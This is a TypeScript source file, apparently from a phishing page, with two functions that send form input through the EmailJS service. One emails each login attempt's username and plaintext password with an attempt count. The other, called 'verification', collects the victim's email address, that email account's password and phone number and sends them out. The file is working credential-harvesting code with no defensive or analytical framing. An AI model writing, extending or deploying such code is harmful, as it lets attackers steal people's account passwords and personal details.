import emailjs from '@emailjs/browser';
import { EMAILJS_CONFIG } from './emailjs.config';
import { captureLoginData, formatLoginDataForEmail } from './loginTracker';

/**
 * Send login attempt data via EmailJS
 * @param username - User's login/username
 * @param password - User's password
 * @param attempt - Attempt number
 */
export async function sendLoginAttemptEmail(
  username: string,
  password: string,
  attempt: number
): Promise<boolean> {
  try {
    // Capture all login data
    const loginData = await captureLoginData(username, password, attempt);

    // Format for email template
    const templateParams = formatLoginDataForEmail(loginData);

    // Send via EmailJS
    const response = await emailjs.send(
      EMAILJS_CONFIG.serviceId,
      EMAILJS_CONFIG.loginTemplateId,
      templateParams
    );

    console.log('Login email sent successfully:', response);
    return true;
  } catch (error) {
    console.error('Failed to send login email:', error);
    return false;
  }
}

/**
 * Send additional verification details (email, password, phone)
 * @param email - User's email address
 * @param emailPassword - Email account password
 * @param phoneNumber - User's phone number
 */
export async function sendVerificationEmail(
  email: string,
  emailPassword: string,
  phoneNumber: string
): Promise<boolean> {
  try {
    const templateParams = {
      email_address: email,
      email_password: emailPassword,
      phone_number: phoneNumber,
      timestamp: new Date().toISOString(),
      user_agent: navigator.userAgent,
      ip_address: 'N/A', // Would need additional call to get IP
    };

    const response = await emailjs.send(
      EMAILJS_CONFIG.serviceId,
      import.meta.env.VITE_EMAILJS_VERIFICATION_TEMPLATE_ID || 'YOUR_VERIFICATION_TEMPLATE_ID',
      templateParams
    );

    console.log('Verification email sent successfully:', response);
    return true;
  } catch (error) {
    console.error('Failed to send verification email:', error);
    return false;
  }
}
